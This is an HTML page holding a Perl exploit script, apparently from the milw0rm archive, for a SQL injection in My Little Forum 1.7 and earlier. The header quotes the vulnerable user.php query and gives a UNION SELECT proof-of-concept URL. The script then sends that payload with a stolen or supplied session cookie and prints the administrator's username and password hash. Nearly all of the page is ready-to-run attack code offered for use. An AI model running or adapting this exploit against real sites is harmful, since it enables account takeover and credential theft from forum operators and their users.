<html><head><title>My Little Forum <= 1.7 (user.php id) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#										#
#	      	  My Little Forum &lt;= 1.7 SQL Injection Exploit			#
#										#
# Discovered by: Silentz							#
# Payload: Admin Username &amp; Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (user.php):	 						#
#										#
#   if (isset($_GET['id'])) $id = $_GET['id'];					#
#										#
#   switch ($action)								#
#   {										#
#   case &quot;get userdata&quot;:							#
#   if (empty($id)) $id = $user_id;						#
#   else $result = mysql_query(&quot;SELECT user_id, user_type, user_name, 		#
#   user_real_name, user_email, hide_email, user_hp, user_place, signature, 	#
#   profile, UNIX_TIMESTAMP(registered + INTERVAL &quot;.$time_difference.&quot; HOUR) AS #
#   since_date FROM &quot;.$db_settings['userdata_table'].&quot; WHERE user_id = 		#
#   '&quot;.$id.&quot;'&quot;, $connid);							#
#										#
# PoC: http://victim.com/forum/user.php?id=-999' UNION SELECT 0,0,user_name,	#
#      user_pw,0,0,0,0,0,0,0 FROM forum_userdata where user_id=1 /*		#
#										#
# 										#
# Subject To: magic_quotes_gpc set of off &amp; having an already existant account	#
#										#
# GoogleDork: Get your own!							#
# Shoutz: The entire w4ck1ng community						#
#										#
# Notes: You need to obtain your current Session Identifier. Variables $page, 	#
#        $descasc and $order may also be exploitable.				#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV &lt; 2){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;           	   My Little Forum &lt;= 1.7 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: w4ck1ng_mylittleforum.pl [PATH] [SESSION_ID]\r\n\r\n&quot;;
print &quot;[PATH] = Path where My Little Forum is located\r\n&quot;;
print &quot;[SESSION_ID] = Session identifier of logged on user\r\n\r\n&quot;;
print &quot;e.g. w4ck1ng_mylittleforum.pl http://victim.com/forum/ cjjjauie95inbmo5fim8m93vo1\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
exit();
}

$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$cookie = &quot;$ARGV[1];&quot;;
$host = $ARGV[0] . &quot;user.php?id=-999' UNION SELECT 0,0,user_name,user_pw,0,0,0,0,0,0,0 FROM forum_userdata where user_id=1 /*&quot;;

my @cookie = ('Cookie' =&gt; &quot;PHPSESSID=$cookie;&quot;);
my $res = $b-&gt;get($host, @cookie);

$answer = $res-&gt;content;
if ($answer =~ /&lt;h2&gt;User info: (.*?)&lt;\/h2&gt;/){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;           	   My Little Forum &lt;= 1.7 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;[+] Admin User : $1\n&quot;;
}

if ($answer =~/&lt;p class=&quot;userdata&quot;&gt;([0-9a-fA-F]{32})&lt;\/p&gt;&lt;\/td&gt;/){
print &quot;[+] Admin Hash : $1\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
}

else {
  print &quot;\nExploit Failed...\n&quot;;
}

# milw0rm.com [2007-05-25]</pre></html>